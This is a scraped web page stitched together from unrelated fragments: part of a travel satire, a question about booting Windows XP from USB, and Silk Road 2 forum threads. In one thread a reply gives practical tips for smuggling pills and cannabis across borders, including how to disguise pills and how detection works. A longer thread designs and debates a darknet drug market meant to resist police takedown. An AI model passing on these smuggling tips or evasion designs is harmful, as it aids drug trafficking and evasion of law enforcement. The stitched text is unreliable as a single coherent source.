looking for something a little more sedate, try lesser-known Abu Dhabi. Located a short ride from the glitzy pleasures of Dubai, this gem is staid, beautiful and well-planned. Whichever way you go, the United Arab Emirates is a good deal right now -- property values tumbled during the downturn but are rising again, and the country's extensive infrastructure and commercial development guarantee you easy access to most of the pleasures of home.Bond Villain: Most experts view Western Sahara as the world's longest-running failed nation, but we'd prefer to think of it as the world's most functional anarchy. While Morocco is ostensibly in charge of the place, the truth is the Western Sahara basically occupies 103,000 square miles of empty, unpoliced space positioned between Morocco, Mauritania and Algeria. Only 600 miles (as the crow flies) from Europe, it's a convenient staging ground for any dastardly plans you might want to cultivate. Granted, infrastructure is rare to nonexistent, but a few billion dollars should easily fix that, and the lack of state-level oversight means that you won't have to deal with zoning issues when building your secret hideout.Spiritual Hermit: After spending over a hundred years in relative obscurity, Bhutan still hasn't made much of a blip on the international tourism radar. However, the Asian ""constitutional democratic monarchy,"" once part of Nepal, may be the perfect choice for the stressed banker looking to get away from it all. Located at the eastern end of the Himalayas, Bhutan offers many of the comforts of home, including a cell-phone network, daily flights from Bangkok and New Delhi and Internet access. Not among the world's wealthier countries, Bhutan has chosen to measure its success based upon ""Gross National Happiness."" Among other things, this means tourism development is heavily restricted, so your sense of internal well-being is less likely to be disturbed by the sight of high-rise hotels or the buzzing of snowmobile-riding tourists!Wherever you decide to go, happy hiding."

The persistent volume is where you can safely save data that you want to have available time and again.

What i would like to do, is put this ISO image onto a suitably fast USB memory drive (is USB 2 fast enough?) and make it bootable.  I imagine pluging it into the USB slot.  Rebooting the computer and hey presto, either it automatically executes the  Windows XP OS on the USB stick, or... i'm presented with some GRUB (or similar)  start up menu giving me the choice of which OS to run.  1. So how do i make this Windows XP iso image bootable ?  2. I want this as a security measure... so... how can i also completely disable internet access within Windows XP ?  Such that nothing, no way, no how, (no application, no virus) can contact the internet.

They will be visiting all continents and crossing hundreds of borders, the issue is they will obviously be wanting to have a bit of a partyâ¦  They are looking for advice on how safe it is carrying personal supplies of illegal drugs across borders in a car. Substances will be the usual choices for any kind of trip, a lot of weed and some prescription stuff like valium and oxycontin basically.  Amounts will not generally exceed an ounce of each substanceâ¦  Here are some questions they had:  1. Is it completely ridiculous to carry drugs across borders?  2. How effective can they be at hiding/stashing any supplies?  3. What kind of attention will they get from police at borders?  4. How bad is it to get caught?  5. How easy is it to get drugs without knowing anyone in new places? 6. Any useful advice you can think of?  Many thanks for any help given,  Sade",""

"Silk Road 2 Forums","sagittarius","43783","2014-06-17T23:20:43","Taking drugs across borders?","Discussion/Legal","Prescription pills are easy. Putting them in a prescription bottle even if the label doesn't match should be fine. Or put them in one of those daily pill organizers. A modest amount of prescription pills shouldn't pose any problem. But, of course, different countries have very different laws and tolerance levels for prescription drugs so my general statement above may not apply. I've heard (unconfirmed) that countries like Qatar and UAE are very strict about prescription drugs and have been known to arrest people for possessing them.  Weed is probably the hardest because it has a very pungent and recognizable odor. In my opinion, that will be the one you have the most trouble smuggling, especially if you want to bring a sizable quantity.  Depends what borders you are crossing, if you look like a drug user or act very nervous, what country you're a citizen of, how you hold up when the border agent asks you questions.  Acid will be easy as it is virtually undetectable. MDMA, coke, heroin in large quantities can be difficult to smuggle. Remember, lots of border patrols have dogs and they'll bring out. If they become suspicious of you and get a dog to sniff around your car you'll be fucked carrying that quantity of drugs.  Getting drugs from people in a country you're not from and also when you likely don't speak can be very dangerous. I don't know where you're going but I would caution to avoid trying to buy drugs from strangers in foreign lands.   If you're driving to/from high risk countries you need to be extremely careful and don't take big risks like transporting ounces of hard drugs. It can surely be done but you need some creativity.  No, you don't want to get caught crossing international borders with hard drugs. If you're really driving across the whole world, you need to familiarize yourself with local laws. Some countries may not consider weed very serious; other countries may put you in jail indefinitely or put you to death for possession of it. SE Asia, for example is notorious for having the strictest drug laws in the world. ",""

"Silk Road 2 Forums","ketuvim","9277","2013-12-16T23:16:34","Future of darknet markets: DHT based P2P e-commerce","Discussion/Security"," Abstract    Current darknet markets suffer from a number of defects.  These defects are exemplified by the recent take down of The Silk Road, constant exploitation of current markets, and the numerous recent DDoS attacks.  Herein we propose a peer to peer based market application that provides resilience against attack and detection by authorities.  By it's nature, the market will avoid common pitfalls of current generation software and provide users with a robust, secure, and anonymous platform to buy and sell goods.  We also examine challenges in the current ideation and potential solutions.   1. Introduction    E-Commerce on the darknet has grown exponentially within the last five years.  Due in large part to the advent of the TOR network and Bitcoin, consumers can purchase a wide array of goods with ease in a relatively anonymous and secure fashion.  One of the most popular platforms until very recently was The Silk Road (which will now be referred to simply as SR1), a thriving market where users traded largely in illicit goods.  Yet SR1 was not impervious to attack, and with great opportunities come challenges in equal supply.  After a length investigation, SR1's servers were discovered and shutdown by authorities in the United States of America.  The shutdown of such a large market exposed lingering vulnerabilities that all current darknet markets fall prey.    It is clear that darknet markets will not be able to survive in their current form.  Technologically adept adversaries can execute a number of attacks to destroy consumer confidence and render any market useless.  Fortunately, current technology provides the basis for the next step forward.  Public Key Infrastructure, implemented using a custom certificate authority can provides the basic trust model.  A market built on a P2P overlay network provides the attack resistant infrastructure.  And finally, proof of work currencies such as BitCoin and LiteCoin provide the transactional security required for payment.    In this paper, we discuss the potential attacks to be mounted against current hidden services.  Then we lay the foundation for the next generation of darknet markets with practical examples utilizing current technology.  Finally, we will address currently unresolved implementation issues with the goal of fostering discussion of potential solutions.   2. Anonymous Insecurity: The State of the Art    Darknet markets are currently hosted on either the TOR or I2P overlay networks.  These markets are implemented as regular web services accessible only via anonymous addressing provided by the overlay.  From here forward, these will be referred to as Hidden Services, regardless of any particular overlay network's terminology.  These services provide buyers, sellers, and market operators with a reasonable assumption of privacy.  The overlay typically operate using a Certificate Authority PKI for address resolution, and use TSL and SSL to encrypt traffic.  Traffic is routed through an ""onion network"" to hide both the source and destination of the traffic.  Unfortunately, this anonymity is far from perfect.  As security researchers are fond of saying, you are only as secure as your weakest link.  And here, the market is often the weakest link.    A sufficiently sophisticated adversary can penetrate hidden services by a number of means.  Hackers and well connected state actors will often have access to ""0-day vulnerabilities"".  These 0day vulnerabilities allow attackers to subvert the actual software running the market (such as nginx, Apache, or forum software) to access secret information, such as the physical location of the server or private messages between buyers and sellers.  Thus any market is constantly threatened by any well connected adversary with access to 0day exploits.    Another attack, limited somewhat to TOR service, exploits design implementation details.  A TOR Hidden Service hides itself behind 1-10 introductory nodes that are responsible for ""introducing"" clients to the Hidden Service.  A powerful (but not necessarily sophisticated) attacker could execute a Distributed Denial of Service attack by flooding the introduction point nodes, effectively making them unavailable.  Thus clients will not be able to connect to the service and the market is effectively useless.    The third and perhaps most important vulnerability relies on social engineering.  Market administrators are often targeted by authorities in order to gain personal information such as physical addresses or usernames and passwords that would give them further leverage in attacking the market itself.  SR1 fell victim to this sort of attack, after which authorities had complete access to private messages exchanged between users.    While some of these attacks can be mitigated by careful security procedures, it takes only one reckless user to allow adversaries to gain the upper hand.  It is clear future markets require a ground-up construction to avoid these attacks.      3. The Next Generation: Peer to Peer E-commerce    Peer to Peer markets represent the next logical step for darknet markets.  P2P protocols already underpin many technologies such as TOR, I2P, and BitCoin.  A distributed hash table (DHT) overlay network represents a logical choice for market implementation.  No single server or point of failure means the market is almost impervious to take-down by the authorities. The DHT would be implemented over I2P to provide anonymity and network resilience.  Public key cryptography is used for authentication and encryption of messages.  Trust is controlled and assigned by a central authority (the ""market organizer"" or MO).  The MO would possess a self signed certificate that is widely distributed in the network and hardcoded in various locations (such as the client software) to insure that it cannot be altered.    Joining the market would be a relatively straightforward process: potential participants would submit their individual public keys (PK) to the MO for signing, after which they are pushed to the DHT, associated with the user's nickname.  Sellers, in addition to having their nickname linked to their PK would have their nickname published by the MO to a digitally signed list of authorized sellers.  Using a certificate authority PKI provides a number of important trust controls in the market.  At any time the MO can revoke a certificate in case of unscrupulous buyers and sellers.  All published data can be quickly verified by the certificate chain, making malicious users an inconsequential nuisance.  Because all messages are encrypted between the corresponding parties, authorities have nothing to gain by the open nature of a DHT.    Private messages can easily be exchanged by parties by storing them in the DHT and removing them once they have been read.  Because they will be encrypted with GPG or a comparable system, their presence on the market does not provide any information to authorities.  Private messages can be used to arrange sales and resolve transaction disputes.    Sales would be executed in the form of contracts digitally signed by both parties and pushed to the DHT.  These contracts would act as chains, lengthened by feedback from both the buyer and the sellers about the transaction which would include a 1-5 rating on delivery, product, and payment.  Contract lists are easily accessible via the table and provide a built-in feedback system for users to evaluate other parties.  Users with unacceptably low feedback can be pruned from the market by revoking their certificate.    Payment through the market could be organized by various means, the simplest of which will be outlined here.  In its most basic form, the seller will provide a coin address for the buyer to remit payment.  Upon payment, the goods are delivered.  Should the user fail to provide payment or the seller fails to send goods, negative feedback in the comment chain is the user's only recourse.  Alternative methods will be discussed below along with their advantages and disadvantages.      Distributed hash table overlay networks exhibit a number of benefits.  Because there is no single point of failure, there is no single resource or server that authorities can target.  Seizing any single node does not negatively impact the performance of the market.  Market stability can easily be maintained by utilizing ""supernodes"" as multiple servers hosted by both the MO and market participants which will increase resilience to attack.  Using the I2P routing network provides an anonymous backdrop over which transactions will occur.  Built in encryption means an adversary has little to gain by penetrating any individual user.  Using an overlay network means any number of MO's can operate independently, giving users a number of difference choices in sellers and platforms. Finally, using custom designed software limits the practicality of 0 day exploits.  Security through obscurity is not completely without merit.   4. Asterisk: Current limitations    The current implementation is not without limitations.  In our opinion, the most pressing issue is the potential for information leakage.  All contracts should be encrypted with the public key of the MO, since they will ultimately be responsible for dispute resolution and need access to said contracts.  But in order for feedback to be accessible to others, the parties involved must be known to everyone.  This information could be used to determine targets of interest (particularly large sellers) and perhaps determine buying patterns.  One must question whether the relevant authorities possess the sophistication to actually use this information.  It is a concern none the less.    The second issue that deserves more attention is the payment system.  Up to this point, we have tried to limit the involvement of the MO such that trading can continue between identified market participants even if the MO is not present.  In addition, the MO collects no money and holds no funds.  In order to secure payment via an escrow type system, more trust must be allocated to either the MO or the market as a whole.  Two potential solutions seem to exist.  First: the MO provides an escrow account and handles all payments.  This has the advantage of protecting buyers and sellers from unscrupulous users.  But it also makes the MO a much more active participant in the market, something that is not particularly desirable.  The alternative is using the entire market as an escrow.  Given a sufficiently large user base, each transaction could see a small percentage of the purchase coins distributed evenly to every participant as an escrow.  Once the buyer validates the transaction, the market software automatically forwards the payment to the seller.  This design would assume the motivation to steal the coins would be quite low.  This would require that the number of outstanding coins be a relatively small dollar amount relative to the number of peers.  This way, each peer only holds a small fraction of a dollar in escrow which would be useless for them to steal.    A more practical issue is the actual implementation.  The market software will have to be custom designed.  It will have to run on any number of platforms, mainly Windows, OSX (darwin), and Linux.  This will necessitate a language that supports cross compilation such as golang or virtualization such as Java.  In addition, the supporting software (BitCoin and I2P) will have to be packaged in such a way that the entire experience is user friendly.  At the current time, we suggest implementing the market software as a local web server for the user interface and a JSON/AJAX exposed local service for market functionality.    All issues remain open to discussion and solution.   5. Conclusion    In this article, we have presented the concept and initial implementation for next generation a P2P based darknet market.  The outlined market provides the advantage of encryption by default, resilience to a number of attacks, and security against law enforcement.  The market is dynamic, secure, and trustable with baked in PKI.  Utilizing an overlay network means any number of Market Operators can co-exist.  We wholly believe this represents the future of darknet commerce.

High availability servers run by the market organizer are nothing but nodes with either high throughput, high data density, or both.  Sellers could be required to host larger caches of the market and buyers could receive a small discount for hosting a larger caches as well.  Other incentives could be developed in order to provide guarantees on market up time and availability.  This is the wonderful part about using the market organizer as the root signing authority.  Any put() request to the market (contracts, product listings, reviews) have to be signed by the participants.  These signatures can ultimately be validated against the root certificate.  Any user that attempts to push false data to the DHT would have no luck, since every node would validate the data before adding it by checking the signature.

It all depends on the end goal.  I2P was built specifically for hidden services and it is a great platform as such.  They are not trying to be a general web proxy.","It sounds like Freenet which the author doesn't mention. Freenet already exists and has a few thousand users. You could put a forum on it and vendors would post drug listings and independent escrow agents could provide cryptographically secure 2of3 multisignature escrow. All we need is bitcoin clients and services that provide easy support for multisignature transactions. You can't DOS a Freesite since it is split in many parts across many people's computers, the users themselves. There are no servers to seize.;The greatest improvement for Freenet would be to have an outproxy functionality like Tor exit nodes because most people want to use anonymous networks to access clearnet sites. I2P doesn't have that functionality built in (although you can hack together outproxies). That's why there are millions of Tor users and 35,000 I2P users."
"Silk Road 2 Forums","merge","9277","2013-12-17T16:00:00","Future of darknet markets: DHT based P2P e-commerce","Discussion/Security"," I have to disagree with this. Sure, there are plenty of hackers who are searching for exploits in popular software packages. But the vast majority of them are not doing so in order to target sites like SR. The hackers who want to target sites like SR will analyze whatever software the people using sites like SR are using. If anything there is an advantage to using well established software like Apache, because hackers have been searching for exploits in it for a long time because it is used by so many people and has been around for so long.   It depends on the specifics of the P2P network, but there are always going to be some disadvantages. The primary advantage of P2P tends to be that it scales very well as everybody contributes resources. The disadvantages of P2P vary, but it tends to not be the best solution for anonymity.    Tor doesn't provide that good of anonymity though. There is a big difference between reinventing the wheel, and inventing plate armor to replace leather armor. If anonymity enhancements are not required it does make things a lot easier though. Doing anonymity right is hard, so hard that nobody has even done it yet. Doing decentralization and automatic encryption is easy.    You don't need a centralized trusted party to implement escrow, escrow can be decentralized or done away with in general (as it is actually close to worthless). You also don't need a trusted third party to remove malicious users, you can let people ignore users that they don't like.     That isn't a good way to go about things. It is better if identification credentials are either self signed with the users private key, or derived entirely from the users public key. Also you shouldn't let users overwrite other users information, nodes should clear the oldest data as new data comes in. CA's are widely seen in the security community as the epitome of the wrong way to do things. They are actually the laughing stock of the security community.     I don't see why him being extradited to the USA is a dubious point in the slightest. The fact that he is being extradited to the USA and Ian Clarke isn't is the entire point I was trying to make in the first place. There doesn't need to be a way to remove scammers, there needs to be a way to detect scammers. You can detect scammers without a centralized trusted authority. Having a centralized authority is just going to make it an illegal network which is a massively stupid thing to do when there is nothing inherently illegal about developing a decentralized market or running nodes that support a decentralized market. As soon as you move away from an abstracted 'decentralized market' and move toward an 'illegal drug trafficking market that has a central authority that helps drug users not get scammed, that just happens to be decentralized in infrastructure' you throw out a fucking lot of what you stood to gain.    First of all, the mix network shouldn't be used only for market activity, it should be a general purpose mix network. The primary users will probably be people who want to send highly anonymous messages with automatic encryption. If a market software is built on top of this then there will be many sorts of users mixing traffic together. Also, I think the best solution is to support more than just messaging and markets, it should also allow for sharing of small files and hosting of static websites like Freenet. Having this many potential use cases should lead to a substantially diverse anonymity set. Second of all, the mixes can use Tor for the transport layer between each other and operate as hidden services. This gives anonymity advantages, hides the location of all mixes, and allows users to enter the network with Tor (and bridges and obfsproxy) for membership concealment (both concealment that they use Tor and concealment that they use the secondary mix network that uses Tor for transport). Tor is great for membership concealment and that is what it should be used for, it isn't as good at untraceability and we really would benefit by using an actual mix network.     It should happen.    First of all, Tor and I2P are not mix networks (and especially not chaumian mix networks). Mix networks by definition reorder collected packets prior to sending them out. Tor and I2P are simply anonymity networks. They both rely on an attacker having an inability to see much of the internal network and/or the external internet infrastructure. Particularly, they rely on an attacker being unable to see traffic enter and exit the network. Mix networks generally assume that the attacker can watch all links between all nodes on the entire internet. This is an attacker that can certainly defeat the anonymity of Tor and I2P. So mix networks perceived attacker is the attacker that can deanonymize 100% of Tor and I2P users. The reason I2P is less optimal than Tor, particularly for us, is that since all nodes are by default routers, all clients of the network can be enumerated. Since the attacker can already tell where a vendor is roughly located in the world, due to post marks, the attacker can determine two key pieces of information about the vendor: the vendor is located roughly in a certain geographical area, and the vendor uses I2P. Since not many people use I2P, and since they are dispersed throughout the world, it is usually enough to locate somebody (or narrow them down to a small handful of suspects) if you know that they use I2P and already know roughly where they are located. I2P is also vulnerable to a handful of other attacks that Tor is not vulnerable to, and although Tor is vulnerable to some attacks that I2P is better protected from, I believe that Tor is generally superior to I2P.   I think a better question is, what is the advantage of I2P over Tor? The only thing that really sticks out to me is that I2P users who route (the default setting) may have some level of deniability in the face of internal timing attacks. However, this deniability may not help a drug trafficker much, since intelligence that someone may be a drug trafficker is almost as good as evidence that they are a drug trafficker. Also, keep in mind that vendors rough geolocation is already known, if they route for other I2P users to have deniability from internal timing attacks, there is still going to be massive suspicion when a node that is located in an area that a vendor is located in is identified as having routed traffic associated with the vendor.     I think that C is actually the best choice for cryptographic functions. Some cryptographers would say it is essentially required to write secure crypto code. You need to be able to wipe sensitive information from memory immediately, C makes it very easy to do this as it doesn't rely on garbage collectors. You need to be able to perform constant time operations, C makes this very easy as well and I have heard that it is essentially impossible to do this with many interpreted languages. C is more prone to buffer overflow attacks, but at least a C program can be more secure than the java interpreter is, on the other hand java programs inherit the security deficits of their interpreters.     P2P definitely can help with scalability and can definitely help protect from DDoS attacks. But I don't think it is required. Tor doesn't really count as P2P by the way. I2P is a P2P network though. I think that it is better to split the network into clients and servers, with the servers having P2P between them but not with all clients contributing resources for all clients. The main thing that prevents an attacker from filling the database with bunk entries is that they have a limited amount of bandwidth. Proof of work can help some with this, but admittedly not a whole lot. It can at the very least act as a bottleneck that protects some from weaker attackers. It isn't enough by itself though. Having multiple servers that all contribute resources helps a lot as well, or at least it can if you can think of a design in which they all actually manage to contribute resources of whatever type. Nodes should delete old information as new information comes in, but there should be enough nodes with enough resources that it takes a very strong attacker to cause much disruption. ","That is correct, but in the case of a HTTP web based service (such as silkroad, tor market, etc) there is a huge community of hackers searching for exploits in nginx, apache, SMF, etc.  By using custom software, we limit the number of hackers targeting our technology.;What disadvantages do you see in a P2P network?;As for the goals, I think they are quite clear.  Decentralize market infrastructure and built in encryption/verification security.  TOR already provides good anonymity and there is no need to reinvent the wheel.  We can adapt proven technology to our needs.  This market would obviously be accessed via TOR, that is a given.;You're making two mutually exclusive points.  You need a trusted third party to implement any sort of escrow and remove malicious users, so some centralization of authority is necessary.  It is the infrastructure that is largely decentralized.;You made a two different points here that I'll address one by one because I think they'll clear up some misconceptions other people may have as well.  First you ask why we need a CA.  This is because in a DHT, anyone can write any data to the table and overwrite anyone elses data.  That means an attacker could overwrite your public key information with their own, then anyone who pulls that key to send you a private message is actually writing a message to the attacker.  Thus certificates allow all network nodes to validate any data being pushed to make sure they come from the right person.  If the signature isn't right, the data is dropped.;Freedom Hosting is a dubious example because it is almost certain he will be extradited to the United States and charged there.  You do bring up an interesting point though, and its not unreasonable that items for sale would not be publically listed (they would have to be requested individually from users), giving the MO means for plausible deniability.  Unfortunately to guarantee stability in the market and maintain user trust, there has to be a way to remove scammers.;I can only assume you're referring to anonymizing layers such as cashmere or AP3.  Both are fantastic when there illegal traffic constitutes a minority of the network.  The issue is this: if everyone on your market place is selling/buying drugs and the government knows this, then all they do is subpoena a T1 ISP to packet filter anything that looks like your market, get addresses from the IP's, and stake out these people's mailboxes.  If everyone in your network mesh is doing something illegal, then routing the traffic around to hide its source is largely irrelevant.  That's why TOR is the logical option for implementing your chaum mix anonymizing layer.;That is an excellent idea.  At this time I just considered using the bitcoind JSON RPC.  It's possible though the every node in the network could serve as a mixing agent though.;Can you elaborate further on why I2P is less secure than say TOR or any other mix network?;What advantage does C or C++ offer over a language like Java or Go in practical terms for cryptography?  The only one I can think of is speed and this is irrelevant when the amount of data being encrypted per transaction is in the order of hundreds of bytes.  If anything, a C/C++ program is harder to write cross platform and more prone to buffer overflows etc.  ;There are two very important reason for P2P with a Certificate Authority and they both relate to potential attacks.  P2P is necessary to make a DDoS attack untenable for the attacker.  And without a CA to validate input, what would prevent a malicious user from filling your database completely with bunk user entries and growing the database exponentially, thus forcing nodes to either quit the market or actively delete information?"
"Silk Road 2 Forums","merge","9277","2013-12-17T18:42:14","Future of darknet markets: DHT based P2P e-commerce","Discussion/Security"," There are cryptographic protocols that remove the worry of people tampering with data on their servers. Cryptographic signatures come to mind. So do message authentication codes. You want to have a trusted third party that signs every message, I want every message to be self signed by the person who wrote it, and I want the pseudonym of every person to be directly derivable from the public key that is linked to the private key that is used for signatures. It really comes down to the difference between TLS and Tor Hidden Services. A TLS certificate is signed by a trusted CA, a .onion site doesn't need this because the URL to access it is derived from its public key. TLS is fraught with peril and it is widely recognized as an insecure and shitty security system, like I said it is the laughing stock of the security community. Look how easy it is for an attacker like the NSA to gain access to the centralized trusted signature key of a CA and carry out MITM attacks, or really how easy it is even for somebody who runs an exit node to carry out a MITM attack in many cases. Having trusted third parties is bad in itself, but centralization of security to a single trusted key or set of trusted keys is bad even if you can trust the third party. These issues are all avoidable with smart use of cryptography, there is no reason to reinvent TLS when it should already be on its way out.       No, in my system the servers are totally trustless in this regard. In your system the CA needs to be trusted, in my system nobody needs to be trusted. If servers tamper with any of the data they hold it will be immediately detected when signatures fail to verify or when message authentication codes fail to verify. If you never heard any security researcher say that CA's are laughable you must have never read about how people feel about the SSL/TLS model. This isn't a perfect example of where CA's shine, there is literally no place where CA's shine. A CA is inherently putting your trust in some third party and there are designs that totally remove the need for this. Just like Tor Hidden Services have end to end encryption and authentication and totally avoid the risk of MITM attacks, whereas TLS relies on a trusted third party and the security of the trusted third party to obtain these things. Sure, the developers should have a private signature key that can sign updates, and you might even use that for automatic updates (which is actually very risky and should probably be avoided, especially for something like this), but that is a total different thing actually. Developers signing updates != having a centralized certificate authority that signs keys and messages for everybody else.    No, they are completely in the realm of practicality. People like to pretend that the attacks on these networks are ""only theoretical"" but they are just deluding themselves, they are attacks that have been carried out against the live networks or failing that simulated versions of them. I also hate the ""yet to be broken"" idea, it is honest to god just a horrible way to think of things. I just got a new shirt, it has yet to be broken by a bullet, does that mean I should go get in a gun fight? The best practice is to stay several steps ahead, because eventually the people who are only one step ahead are going to be caught up with. People who wait for a system to be broken before they move to a better one are the people who are compromised in the next ground breaking attack. And there is a constant stream of ground breaking attacks.    1. I can find you dozens of cryptographers who will tell you that a C crypto program is inherently more secure than a java crypto program 2. the application is run in the JVM, and it inherits the security deficits of the JVM, this is not the case for C programs as they don't rely on an interpreter ","You make some good points here but I think we fundamentally disagree on a couple issues.  First of all, you suggest that using a CA is bad practice because you have to trust the market organizer.  Yet in your model, you have to trust the people running the servers not to tamper with data.;So either way you have a trust problem.   The advantage with my system is distributing a hash table means nodes can independently verify based on the certificate chain.  In your system, users have to simply trust that whoever is running the servers.  Regardless, I've never heard any security researcher say that CA's are laughable.  Every technology has its use and this is a perfect example of where CA's shine (authentication + encryption + revoke-ability).  Keep in mind a CA also allows us to push signed automatic software updates in case a vulnerability is discovered.;I think your idea for a legitimate chaun mix net is a wonderful idea, but until you've got tens of thousands of legitimate users in addition to your market users, it's just that: a wonderful idea.  The attacks you propose on TOR and I2P are completely in the realm of the theory, not practice.  In practice, TOR traffic is routed through multiple autonomous zones and has yet to be broken.  If we were selling nuclear secrets I'd worry about the NSA cracking the network, but if that's the case then RSA is useless anyway.;C or C++ is only one of many languages that does not copy objects in memory and does not have garbage collection.  The same security guarantees can be made by Go, x86 assembly, or any number of other languages.  You would be hard pressed to find any sane person that would tell you a C program is more secure by default than a java program.  We're not talking about attacking the JVM with a malicious code, we're talking about attacking an application on the JVM with malicious input."

Most of the papers that discuss attacks are written by people who carried the attacks out with success against the live Tor network or against simulated Tor networks. It wont take long for people to start using a secure, convenient and intuitive mix network for their messaging needs. And it doesn't take very long to hide any type of traffic, because nobody knows who is using the network for what anyway.    People should be worried about the NSA and other lesser attackers as well.    Tor uses TLS in a nonstandard way between clients and nodes, it doesn't use CA's or anything similar at all for this. Tor node information is signed by the DA nodes to show that they have consensus, not for authentication of the hidden services. Hidden services don't need their public key to be signed by a CA/DA because of the simple fact that they are obviously the holder of their private key as their URL is derived from the public key that is linked to their private key. There is absolutely no benefit to using a CA model for Tor Hidden Services. CA is an old and shitty model, why do you think absolutely none of the anonymity networks use them? Tor has some things that appear somewhat similar, but they actually accomplish totally different things than a standard CA does (ie: DA's sign the list of nodes they are aware of so clients can determine that the DA's have a consensus). DA = directory authority, it is not a certificate authority. The HSDIRs don't sign the HS descriptors, they are self signed by the HS, and it can be proven that the HS signed it because the HS has a URL that is derived from the public key that is used to verify the signature on the descriptor. The closest thing Tor has to a CA is a set of DA's and the only reason they sign node information is to make sure all clients and all directory authority servers are working with the same set of relay nodes.        Does AES have a huge list of crippling attack papers describing how it is practically breakable by adversaries with relatively small amounts of resources? Anonymity != Cryptography. Also, AES is theoretically breakable in the sense that it actually makes sense to use the term theoretically breakable. In cryptography a cryptosystem is theoretically breakable if there are attacks that can reduce the key space from 2^x, where x is the maximum key space the algorithm could possibly have (ie: 256 bits for AES-256). There are attacks against AES-256 that can significantly reduce its key space below 256 bits, so it is theoretically broken. But none of the attacks against it can be used to break it before the end of life on earth, with the computing resources available today. So it isn't practically broken. Tor is practically broken. There are trivial attacks against it that can geolocate hidden services, users can be trivially traced to their entry guards, users can trivially be traced to a single ISP, and if the attacker owns your entry guard or watches your internet connection from your ISP you are essentially fucked. I wouldn't say that this is theoretical simply because no attacker who isn't an academic researcher has carried it out, I would say it is a practical attack because academic researchers have carried it out with great success and the results mean that it just isn't anonymous enough for me. I am fine to wait for the end of the earth for theoretically broken AES-256 to lead to my compromise, but I am not going to wait for non-academic researchers to learn how traffic analysis works before I want to switch to a more anonymous network.      The interpreter is a C program that has a Java program running inside of it. The java program gets input that is interpreted by the C program. The C program is potentially weak to buffer overflow attacks, and it can have input introduced to it through the Java program. The JVM is a C program that is weak to buffer overflow attacks through the applications that run in it. Application security is never greater than interpreter security. I hope that is clear now. ","Please show me where TOR anonymity has been broken because there are no case I'm aware of.  I've seen the literature, but I've never seen an attack.  TOR has been well tested for over a decade.  On the other hand, you admitted yourself that your mixing network would require a huge amount of legitimate users to hide illegitimate traffic.  How many years is it going to take to build that network?;Regardless, if we're worried about the NSA we should just quit now because I promise you they hire mathematicians and cryptographers who are 30 years ahead of anything we have.;TOR not only uses signed certificates for directory services (ie actually locating the hidden service), but it uses the TLS handshake to initiate encrypted connections.;AES is yet to be broken, should we all abandon that and find a new solution?  In cryptography, everything is unbroken until proven otherwise.  That is the nature of the beast.;I think you're misunderstanding the type of exploits that are reported for the JVM.  JVM exploits allow java code the user has already downloaded to execute with higher than normal privileges.  This does not mean sending some malformed string to a java application over the web and this leading to say a buffer overflow.  Hence application security and interpreter security are unrelated in this instance. I hope that is now clear."

As I understand it there are a few services out in the darkness right now that use DHT style data distribution. The beautiful thing about this idea is that if you make the marketplace an application all on its own you can use existing anomization technologies, and create an infinitely redundant copy of the data. If each instance of the application were to say have a configuration for quantity of data to be stored operators of the site could dedicate multiple servers located in different parts of the world and host a complete copy of the service each, and equivalently share the load.   This also allows users who wish to only host the bare minimum of the hash to choose to do so, but would also alow users such as myself to additionally set up my own servers in remote locations and host a very large portion of the data, effectively enhancing the operation of the service. This makes alot of sense to me.  Of course allowing users to host copies of the data does present a security risk, but with a sufficiently strong encryption this could be a mute point. Ill definitely be checking back on this thread.",""

The only thing you can do is try to minimize the damage of such attacks.    Yes, the biggest weakness currently is the centralization and semi-centralization of markets and market administrators. Decentralization will buy us a lot of security and resilience.    First of all, I don't think that full P2P is the way to go. It definitely has advantages, primarily in scalability, but it also has a lot of disadvantages. I suppose the first thing we should do is determine what our goals are. Do we want to increase our anonymity past that which can be provided by Tor? Are we mainly only interested in decentralization of power and server infrastructure? Do we want to handle encryption for the users? The first step is to make a threat model and decide the power of the attacker who we want to protect ourselves against. If one of our goals is very strong anonymity then I think that full P2P is not the best approach. If we don't care about stronger than Tor anonymity then P2P is a fine option, and it does have some good advantages.   Second of all, I know that a centralized market authority is a bad idea. It isn't required even in non-fully P2P systems, and it really goes against the idea of P2P as well. I am totally against centralized trust authorities. How can you trust the trust authority? The same sort of attack that you just talked about fucking SR1 would work against a system with a centralized trust authority.    What is the point of a participants key being signed by a centralized trusted service? There is no point at all, the public key works as a unique and secure identifier regardless of if it is signed or not. I think that it is better if the clients nickname is derived from their public key, and other users can assign them whatever name they want as a nickname. How can we trust the market organizer to say that certain users are good or not? Also, why are we having this as an illegal program? The MO would apparently know that users are trafficking in drugs and illegal items. So they are breaking the law. The biggest benefit we can gain from a system like this is the fact that it isn't illegal to run it. Look at Freedom Hosting. The admin let people host CP and not he is going to go to prison because of it. The key here is that it had a centralized market operator if you will, and so he became a target. Now look at a freenet. It is a distributed network that lets people host CP. Nobody who runs a freenet node is going to prison, and Ian Clarke, the lead developer of Freenet, is a well respected computer scientist and not even anonymous. In practice there is not much of a difference at all between Freedom Hosting and Freenet, but legally there are important distinctions. The biggest mistake of the current markets is that they are designed for and openly engage in drug trafficking and other illegal activities, the future decentralized markets need to be neutral to the types of products sold on them and that means there cannot be some centralized market organizer who says he trusts drug traffickers and doesn't trust scammers.    This works if you rely on existing anonymity networks to provide the anonymity of the market, but if you want to have really strong anonymity you need to put a lot more thought into your anonymity protocol. Myself and several others have been thinking of and designing and programming a distributed anonymous marketplace for the past several years and we are not even to the point where we can make our system scale to hundreds of thousands of users. This is after thousands and thousands of man hours researching and developing and testing anonymity protocols. Anonymity is hard, but if you are okay with using Tor grade anonymity you can skip this very hard part of the process (and it is hard to design and hard to code).    This is a good idea, we have not gotten to the point yet where we have even thought of a feedback system like this. My suggestion is to ditch to central market authority and rather have a system that is similar to a decentralized safe or scam, built on top of your distributed market. I think this is the approach we are going to take.   We should build in a distributed trustless free to use blind mixing system, something based off of zerocoin.       Using I2P is a bad idea because it means that the anonymity of participants falls to anonymity provided by I2P. I don't understand everybody and their sudden interest in I2P, but trust me when I say it is NOT something that we want to use. Understand the difference between traffic analysis / SIGINT(not to mention between traceability, linkability, observability, etc), encryption/COMINT, etc. There are a lot of nuanced things to take into account and if you have an over simplified understanding of these things or start to lump them together into singular concepts you will be on a fast path to fucked. There should only be one platform and there should be no market organizers. Security through obscurity is completely without merit when you are somebody who will be targeted, it only works when you are only defending from dragnet attacks.    You are decentralizing your market hosting but still centralizing social power and therefore you are not protecting from as much as you think you are. A decentralized market network should be just that. Feedback can use an undrug/undrugged/safe-or-scam model, where people can gather feedback on parties they have contact information for.    Escrow systems are over rated and retarded. If you want to have 